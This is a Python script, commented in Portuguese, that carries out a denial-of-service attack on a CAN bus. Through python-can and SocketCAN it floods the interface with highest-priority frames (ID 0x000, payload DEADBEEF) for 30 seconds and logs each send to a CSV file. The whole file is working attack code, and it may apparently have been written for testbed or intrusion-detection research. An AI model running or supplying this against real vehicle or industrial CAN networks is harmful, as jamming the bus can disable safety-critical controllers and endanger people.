import can
import time
import csv
import os

# --- Parâmetros do Ataque ---
CAN_INTERFACE = 'can0'
ATTACK_ID = 0x000
ATTACK_DATA = [0xDE, 0xAD, 0xBE, 0xEF, 0xDE, 0xAD, 0xBE, 0xEF]
ATTACK_DURATION_SECONDS = 30
ENABLE_DELAY = True
DELAY_BETWEEN_MSGS = 0.0001
LOG_FILENAME = "log_ataque_dos.csv"

def run_dos_attack():
    print("🚨 Iniciando o ataque de Negação de Serviço (DoS)...")
    print(f"Interface: {CAN_INTERFACE}")
    print(f"ID da Mensagem de Ataque: {hex(ATTACK_ID)}")
    print(f"Duração: {ATTACK_DURATION_SECONDS} segundos")

    bus = None
    message_count = 0
    error_count = 0

    # Prepara o arquivo de log CSV
    with open(LOG_FILENAME, mode='w', newline='') as csvfile:
        logwriter = csv.writer(csvfile)
        logwriter.writerow(["Timestamp", "Status"])  # Cabeçalho

        try:
            bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')
            msg = can.Message(arbitration_id=ATTACK_ID, data=ATTACK_DATA, is_extended_id=False)
            start_time = time.time()

            while time.time() - start_time < ATTACK_DURATION_SECONDS:
                timestamp = time.time()
                try:
                    bus.send(msg)
                    logwriter.writerow([timestamp, "OK"])
                    message_count += 1
                except can.CanError as e:
                    logwriter.writerow([timestamp, f"Erro: {e}"])
                    error_count += 1
                    time.sleep(0.001)

                if ENABLE_DELAY:
                    time.sleep(DELAY_BETWEEN_MSGS)

            end_time = time.time()

            print("\n✅ Ataque Finalizado")
            print(f"Duração: {end_time - start_time:.2f} segundos")
            print(f"Mensagens enviadas com sucesso: {message_count}")
            print(f"Mensagens com erro: {error_count}")

        except Exception as e:
            print(f"❌ Erro crítico: {e}")
        finally:
            if bus:
                try:
                    bus.shutdown()
                    print("🔌 Conexão com o barramento CAN encerrada.")
                except:
                    print("⚠️ Falha ao encerrar a interface CAN.")

if __name__ == "__main__":
    run_dos_attack()
